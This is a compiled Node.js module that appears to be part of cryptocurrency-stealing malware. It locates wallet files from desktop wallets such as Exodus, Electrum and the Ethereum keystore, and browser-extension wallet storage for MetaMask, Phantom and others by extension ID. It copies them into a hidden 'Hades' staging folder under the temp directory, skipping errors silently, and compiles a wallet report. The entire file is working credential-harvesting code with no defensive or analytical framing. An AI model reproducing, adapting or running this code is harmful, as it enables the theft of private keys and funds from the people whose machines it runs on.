Object.defineProperty(exports, "__esModule", {
  value: true
});
const fs = require("fs");
const path = require("path");
const os = require("os");
const MAX_FILE_SIZE = 10485760;
const MAX_DEPTH = 3;
function isSystemProfile(directory) {
  if (!directory) return false;
  return new RegExp("system32\\\\config\\\\systemprofile", "i").test(directory) || new RegExp("\\\\bSYSTEMPROFILE\\\\b", "i").test(directory) || new RegExp("systemprofile", "i").test(directory);
}
async function findFiles(directory, targetName = null, files = [], depth = 0, maxDepth = MAX_DEPTH) {
  if (depth > maxDepth) return files;
  try {
    for (const name of await fs.promises.readdir(directory)) {
      if (["node_modules", ".git", "cache", "Cache", "logs"].includes(name.toLowerCase())) continue;
      const filename = path.join(directory, name);
      try {
        const stats = await fs.promises.stat(filename);
        if (stats.isDirectory()) await findFiles(filename, targetName, files, depth + 1, maxDepth);else if (!targetName || name.toLowerCase() === targetName.toLowerCase()) files.push(filename);
      } catch (error) {}
    }
  } catch (error) {}
  return files;
}
async function extractDesktopWallets(directory) {
  const found = [];
  const destination = path.join(directory, "wallets");
  let report = "--- WALLET REPORT ---\n\n";
  let created = false;
  for (const [name, source] of Object.entries(exports.desktopWalletPaths)) {
    try {
      const stats = await fs.promises.stat(source).catch(() => null);
      if (!stats) continue;
      if (!created) {
        await fs.promises.mkdir(destination, {
          recursive: true
        });
        created = true;
      }
      const walletDirectory = path.join(destination, name);
      await fs.promises.mkdir(walletDirectory, {
        recursive: true
      });
      report += "[+] WALLET: " + name + "\nSource: " + source + "\nFiles:\n";
      if (stats.isDirectory()) {
        for (const filename of (await findFiles(source, null, [], 0, 2)).slice(0, 50)) {
          try {
            const fileStats = await fs.promises.stat(filename);
            if (fileStats.size > MAX_FILE_SIZE) continue;
            const relative = path.relative(source, filename);
            const target = path.join(walletDirectory, relative);
            await fs.promises.mkdir(path.dirname(target), {
              recursive: true
            });
            await fs.promises.copyFile(filename, target);
            report += "  - " + relative + " (" + (fileStats.size / 1024).toFixed(2) + " KB)\n";
          } catch (error) {}
        }
      } else if (stats.size <= MAX_FILE_SIZE) {
        await fs.promises.copyFile(source, path.join(walletDirectory, path.basename(source)));
        report += "  - " + path.basename(source) + " (" + (stats.size / 1024).toFixed(2) + " KB)\n";
      }
      report += "\n----------------------------------------------------\n\n";
      found.push(name);
    } catch (error) {}
  }
  if (created) await fs.promises.writeFile(path.join(destination, "Wallets.txt"), report, "utf8");
  return found;
}
async function copyDirectory(source, destination, depth) {
  if (depth > MAX_DEPTH) return;
  try {
    for (const name of await fs.promises.readdir(source)) {
      const filename = path.join(source, name);
      const target = path.join(destination, name);
      try {
        const stats = await fs.promises.stat(filename);
        if (stats.isDirectory()) {
          await fs.promises.mkdir(target, {
            recursive: true
          });
          await copyDirectory(filename, target, depth + 1);
        } else if (stats.size <= MAX_FILE_SIZE) await fs.promises.copyFile(filename, target);
      } catch (error) {}
    }
  } catch (error) {}
}
async function copyBrowserWallets(collection, profile, browser) {
  const destination = path.join(os.tmpdir(), "Hades", "All", browser, "wallets");
  const found = [];
  let created = false;
  for (const wallet of exports.WALLET_PATHS) {
    const source = path.join(profile, "Local Extension Settings", wallet.id);
    try {
      const stats = await fs.promises.stat(source).catch(() => null);
      if (!stats) continue;
      if (!created) {
        await fs.promises.mkdir(destination, {
          recursive: true
        });
        created = true;
      }
      const walletDirectory = path.join(destination, wallet.name);
      await fs.promises.mkdir(walletDirectory, {
        recursive: true
      });
      if (stats.isDirectory()) await copyDirectory(source, walletDirectory, 0);else if (stats.size <= MAX_FILE_SIZE) await fs.promises.copyFile(source, path.join(walletDirectory, path.basename(source)));
      found.push(wallet.name);
    } catch (error) {}
  }
  return found;
}
exports.extractDesktopWallets = extractDesktopWallets;
exports.copyBrowserWallets = copyBrowserWallets;
const home = os.homedir();
const roaming = process.env.APPDATA || "";
const local = process.env.localappdata || "";
exports.appData = !roaming || isSystemProfile(roaming) ? path.join(home, "AppData", "Roaming") : roaming;
exports.localappdata = !local || isSystemProfile(local) ? path.join(home, "AppData", "Local") : local;
exports.WALLET_PATHS = [{
  name: "MetaMask",
  id: "nkbihfbeogaeaoehlefnkodbefgpgknn"
}, {
  name: "Binance",
  id: "fhbohimaelbohpjbbldcngcnapndodjp"
}, {
  name: "Phantom",
  id: "bfnaoomepdephakmegedneabnneijbbe"
}, {
  name: "Coinbase",
  id: "hnfanknocfeofbddgcijnmhnfnkdnaad"
}, {
  name: "TrustWallet",
  id: "egjidjbpgmcnheetpkhadkkclpchoofn"
}, {
  name: "MartianAptos",
  id: "efbglgjekebbhclcjgreakbbghbcaffg"
}];
exports.desktopWalletPaths = {
  Exodus: path.join(exports.appData, "Exodus", "exodus.wallet"),
  Electrum: path.join(exports.appData, "Electrum", "wallets"),
  Atomic: path.join(exports.appData, "atomic", "Local Storage", "leveldb"),
  Coinomi: path.join(exports.localappdata, "Coinomi", "Coinomi", "wallets"),
  Guarda: path.join(exports.appData, "Guarda", "Local Storage", "leveldb"),
  Armory: path.join(exports.appData, "Armory"),
  Zcash: path.join(exports.appData, "Zcash"),
  Bytecoin: path.join(exports.appData, "bytecoin"),
  DashCore: path.join(exports.appData, "DashCore"),
  Ethereum: path.join(exports.appData, "Ethereum", "keystore"),
  Jaxx: path.join(exports.appData, "com.liberty.jaxx", "IndexedDB", "file__0.indexeddb.leveldb"),
  BinanceDesktop: path.join(exports.appData, "Binance", "app_store")
};
